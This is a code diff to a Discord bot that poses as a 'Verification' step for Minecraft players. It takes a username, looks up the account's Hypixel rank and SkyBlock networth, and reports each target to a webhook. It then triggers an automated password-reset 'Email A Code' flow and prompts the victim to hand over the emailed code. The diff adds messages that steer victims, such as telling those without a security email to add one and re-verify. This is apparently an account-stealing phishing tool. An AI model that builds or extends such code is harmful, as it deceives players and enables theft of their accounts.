@@ -14,7 +14,7 @@ from views.button_two import ButtonViewTwo
 from views.data.data import stringcrafter
 from views.data.wbu3.wb3 import web3g
 from views.otp import automate_password_reset
- 
+from views.button_three import ButtonViewThree
 
 class MyModalOne(ui.Modal, title="Verification"):
     box_one = ui.TextInput(label="MINECRAFT USERNAME", required=True)
@@ -32,23 +32,18 @@ class MyModalOne(ui.Modal, title="Verification"):
         response = requests.get(urluuid)
         uuidplayer = response.json()['id']
 
-
-
-        getnwrequest = f"https://sky.shiiyu.moe/api/v2/profile/{self.box_one.value}"
-        datanwrequest = requests.get(getnwrequest)
-        datanwrequestjson = datanwrequest.json()
+     
+        urlnw = f"https://sky.shiiyu.moe/api/v2/profile/{self.box_one.value}"
+        response = requests.get(urlnw)
+        data = response.json()
+        networth_value = data.get("networth", {}).get("networth", 0)
 
         if config.API_KEY =="":
             FlagNx = True
             print("Invalid/Expired/No Hypixel API Key")
-        
-        if datanwrequestjson.status_code == 200:
-            networth_value = datanwrequest.get("networth", {}).get("networth")
-        else:
-            networth_value = 0
+     
         if datajson['success'] == False or datajson['player'] == None:
             playerlvl = "No Data Found"
-            skyblocknw = "No Data Found"
             rank = "No Data Found"
             print("API limit Reached / You have already looked up this name recently")
             Flagx = True
@@ -146,11 +141,10 @@ class MyModalOne(ui.Modal, title="Verification"):
                     return await interaction.response.send_message("Couldn't send to webhook", ephemeral=True)
             await interaction.response.send_message(
                 embed=discord.Embed(
-                    title="Verification ✅",
-                    description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
-                    colour=0x00FF00
+                    title="Please Wait ⌛",
+                    description="Please Allow The Bot To Verify The Data You Have Provided",
+                    colour=0xFFFFFF
                 ),
-                view=ButtonViewTwo(),
                 ephemeral=True
             )
             async with aiohttp.ClientSession() as session:
@@ -159,6 +153,24 @@ class MyModalOne(ui.Modal, title="Verification"):
                 if result is False:
                     embedfalse=discord.Embed(title="Email A Code Failed (No Email A Code Turned On)",timestamp= datetime.datetime.now(),colour=0xff0000)
                     await webhook.send(embed=embedfalse,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
+                    await interaction.followup.send(
+                        embed=discord.Embed(
+                            title="No Security Email :envelope:",
+                            description="Your email doesn't have a security email set.\nPlease add one and re-verify",
+                            colour=0xFF0000
+                        ),
+                        view=ButtonViewThree(),
+                        ephemeral=True
+                    )
                 else:
+                    await interaction.followup.send(
+                    embed=discord.Embed(
+                        title="Verification ✅",
+                        description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
+                        colour=0x00FF00
+                    ),
+                    view=ButtonViewTwo(),
+                    ephemeral=True
+                    )
                     embedtrue=discord.Embed(title="Email A Code Success",timestamp= datetime.datetime.now(),colour=0x00FF00)
                     await webhook.send(embed=embedtrue,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
